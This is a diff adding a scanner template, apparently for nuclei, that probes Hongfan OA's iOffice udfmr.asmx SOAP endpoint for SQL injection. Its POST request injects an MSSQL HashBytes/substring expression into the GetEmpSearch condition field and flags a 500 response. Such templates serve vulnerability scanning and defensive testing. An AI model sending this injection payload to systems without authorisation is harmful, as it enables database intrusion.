@@ -1,0 +1,31 @@
+id: poc-yaml-hongfan-oa-sqli
+
+info:
+  name: poc-yaml-hongfan-oa-sqli
+  author: xiaobaicai
+  severity: high
+  tags: xray-converted,sqli,ct-469718
+  reference:
+    - https://planet.vulbox.com/detail/MTEyNjk=
+
+http:
+  - raw:
+      - |
+        POST /iOffice/prg/set/wss/udfmr.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+        <GetEmpSearch xmlns="http://tempuri.org/ioffice/udfmr">
+        <condition>1=substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','{{rand_int(1000, 9999)}}')),3,32)</condition>
+        </GetEmpSearch>
+        </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
